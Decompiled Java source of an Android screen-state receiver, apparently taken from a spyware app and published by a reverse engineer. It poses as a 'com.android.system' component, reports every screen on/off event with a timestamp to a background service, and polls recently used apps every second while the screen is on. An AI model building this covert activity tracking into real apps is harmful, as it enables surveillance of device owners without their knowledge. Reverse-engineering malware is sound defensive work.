package com.android.system;

import android.app.ActivityManager;
import android.app.ActivityManager.RecentTaskInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.SystemClock;
import com.app.system.common.service.EventsAndReceiveService;
import java.util.Iterator;
import java.util.List;

public class ScreenReceiver
  extends BroadcastReceiver
{
  private static boolean a = false;
  private static boolean b = false;
  
  public static void a(Context paramContext)
  {
    IntentFilter localIntentFilter = new IntentFilter("android.intent.action.SCREEN_ON");
    localIntentFilter.addAction("android.intent.action.SCREEN_OFF");
    paramContext.registerReceiver(new ScreenReceiver(), localIntentFilter);
  }
  
  private static void a(Context paramContext, boolean paramBoolean)
  {
    Intent localIntent = new Intent(paramContext, EventsAndReceiveService.class);
    localIntent.putExtra("event_core_app", "event_send_screen_status");
    localIntent.putExtra("status", paramBoolean);
    localIntent.putExtra("timestamp", System.currentTimeMillis());
    com.b.a.a.a.a(paramContext, localIntent);
  }
  
  private void b(Context paramContext)
  {
    a = true;
    com.security.d.a.d("ScreenReceiver", "SCREEN ON", new Object[0]);
    a(paramContext, true);
  }
  
  private void c(Context paramContext)
  {
    a = false;
    com.security.d.a.d("ScreenReceiver", "SCREEN OFF", new Object[0]);
    a(paramContext, false);
  }
  
  private void d(Context paramContext)
  {
    com.security.d.a.d("ScreenReceiver", "ALARM RICEVUTO", new Object[0]);
    b = false;
    f(paramContext);
    if (a) {
      e(paramContext);
    }
  }
  
  private void e(Context paramContext)
  {
    if (b)
    {
      com.security.d.a.d("ScreenReceiver", "scheduleAlarm: allarme già schedulato", new Object[0]);
      return;
    }
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 1, new Intent(paramContext, ScreenReceiver.class), 0);
    ((AlarmManager)paramContext.getSystemService("alarm")).setExact(3, SystemClock.elapsedRealtime() + 1000L, localPendingIntent);
    b = true;
  }
  
  private void f(Context paramContext)
  {
    paramContext = ((ActivityManager)paramContext.getSystemService("activity")).getRecentTasks(10, 0);
    if ((paramContext != null) && (paramContext.size() > 0))
    {
      Iterator localIterator = paramContext.iterator();
      while (localIterator.hasNext())
      {
        ActivityManager.RecentTaskInfo localRecentTaskInfo = (ActivityManager.RecentTaskInfo)localIterator.next();
        paramContext = new StringBuilder();
        paramContext.append("APP in foreground: ");
        paramContext.append(localRecentTaskInfo.baseIntent.getComponent().getPackageName());
        com.security.d.a.d("ScreenReceiver", paramContext.toString(), new Object[0]);
      }
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (paramIntent.getAction() != null)
    {
      if (paramIntent.getAction().equals("android.intent.action.SCREEN_ON")) {
        b(paramContext);
      } else if (paramIntent.getAction().equals("android.intent.action.SCREEN_OFF")) {
        c(paramContext);
      }
    }
    else {
      d(paramContext);
    }
  }
}


/* Location:              ~/com/android/system/ScreenReceiver.class
 *
 * Reversed by:           J
 */